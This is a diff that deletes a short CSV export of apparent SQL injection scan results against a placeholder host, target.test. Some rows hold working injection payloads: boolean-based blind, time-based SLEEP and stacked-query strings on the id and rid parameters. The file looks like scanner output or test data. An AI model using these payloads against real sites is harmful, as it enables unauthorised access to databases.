@@ -1,6 +1,0 @@
-Target URL,Place,Parameter,Technique(s),Type,Title,Payload
-http://target.test/item.php?id=1,GET,id,BEU,boolean-based blind,"AND boolean-based blind - WHERE or HAVING clause","id=1 AND 3133=3133"
-http://target.test/item.php?id=1,GET,id,T,time-based blind,"MySQL >= 5.0.12 AND time-based blind","id=1 AND SLEEP(5)"
-http://target.test/search.php?q=x,GET,q,,,,
-http://target.test/login.php,POST,username,,,,
-http://target.test/report.php?rid=7,GET,rid,S,stacked queries,"MySQL stacked queries","rid=7;SELECT SLEEP(5)"
